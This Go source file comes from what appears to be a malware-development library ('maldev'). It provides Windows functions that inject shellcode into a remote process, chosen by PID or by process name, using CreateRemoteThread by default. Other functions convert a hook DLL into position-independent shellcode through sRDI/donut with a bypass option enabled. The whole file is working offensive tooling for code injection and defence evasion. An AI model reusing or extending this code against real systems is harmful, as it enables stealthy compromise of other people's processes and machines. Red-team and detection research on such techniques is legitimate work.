//go:build windows

package hook

import (
	"fmt"

	"github.com/oioio-space/maldev/inject"
	"github.com/oioio-space/maldev/pe/srdi"
	"github.com/oioio-space/maldev/process/enum"
)

// RemoteOption configures RemoteInstall behaviour.
type RemoteOption func(*remoteConfig)

type remoteConfig struct {
	method inject.Method
}

// WithMethod overrides the injection method used by RemoteInstall.
// Defaults to inject.MethodCreateRemoteThread when not set.
func WithMethod(m inject.Method) RemoteOption {
	return func(c *remoteConfig) { c.method = m }
}

// RemoteInstall injects shellcodeHandler into the process identified by pid.
// dllName and funcName identify the hook target but the actual patching is
// performed inside the remote process by shellcodeHandler itself (e.g. an
// sRDI-converted hook DLL produced by GoHandler).
func RemoteInstall(pid uint32, dllName, funcName string, shellcodeHandler []byte, opts ...RemoteOption) error {
	cfg := &remoteConfig{method: inject.MethodCreateRemoteThread}
	for _, opt := range opts {
		opt(cfg)
	}

	injector, err := inject.Build().
		Method(cfg.method).
		TargetPID(int(pid)).
		Create()
	if err != nil {
		return fmt.Errorf("create injector: %w", err)
	}

	return injector.Inject(shellcodeHandler)
}

// RemoteInstallByName resolves processName to a PID and calls RemoteInstall.
// The first matching process is used.
func RemoteInstallByName(processName, dllName, funcName string, shellcodeHandler []byte, opts ...RemoteOption) error {
	procs, err := enum.FindByName(processName)
	if err != nil {
		return fmt.Errorf("find process %q: %w", processName, err)
	}
	if len(procs) == 0 {
		return fmt.Errorf("process %q not found", processName)
	}
	return RemoteInstall(procs[0].PID, dllName, funcName, shellcodeHandler, opts...)
}

// GoHandler converts a hook DLL on disk to position-independent shellcode
// suitable for use with RemoteInstall. entryPoint is the exported function
// that the donut loader will call after mapping the DLL.
func GoHandler(dllPath, entryPoint string) ([]byte, error) {
	cfg := srdi.DefaultConfig()
	cfg.Arch = srdi.ArchX64
	cfg.Type = srdi.ModuleDLL
	cfg.Method = entryPoint
	cfg.Bypass = 3
	return srdi.ConvertFile(dllPath, cfg)
}

// GoHandlerBytes is the in-memory equivalent of GoHandler.
// dllBytes must be a valid MZ/PE image.
func GoHandlerBytes(dllBytes []byte, entryPoint string) ([]byte, error) {
	cfg := srdi.DefaultConfig()
	cfg.Arch = srdi.ArchX64
	cfg.Type = srdi.ModuleDLL
	cfg.Method = entryPoint
	cfg.Bypass = 3
	return srdi.ConvertBytes(dllBytes, cfg)
}
